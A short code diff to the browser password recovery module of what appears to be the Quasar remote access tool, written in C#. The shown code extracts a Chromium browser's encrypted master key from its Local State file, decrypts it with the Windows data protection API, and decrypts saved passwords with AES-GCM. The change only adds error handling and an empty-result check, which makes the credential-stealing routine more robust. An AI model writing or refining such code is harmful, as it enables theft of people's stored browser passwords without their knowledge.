@@ -27,8 +27,18 @@ namespace Quasar.Client.Recovery.Browsers
                     var endIndex = localState.IndexOf('"', startIndex + 1);
                     var encKeyStr = localState.Substring(startIndex, endIndex - startIndex);
 
-                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
-                        DataProtectionScope.CurrentUser);
+                    try
+                    {
+                        _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null,
+    DataProtectionScope.CurrentUser);
+                    }
+                    catch (Exception e)
+                    {
+                        Debug.WriteLine(localStatePath);
+                        Debug.WriteLine(e);
+                        Debug.WriteLine("Failed to decrypt the key. Ensure you have the correct local state file.");
+                        return;
+                    }
                 }
             }
             catch (Exception e)
@@ -54,6 +64,9 @@ namespace Quasar.Client.Recovery.Browsers
                 var authTag = encryptedData.Skip(encryptedData.Length - 16).ToArray();
 
                 var decryptedPassword = DecryptAesGcm(actualEncryptedData, _key, initialisationVector, authTag);
+
+                if (decryptedPassword == null || decryptedPassword.Length == 0)
+                    return "";
 
                 return Encoding.UTF8.GetString(decryptedPassword);
             }
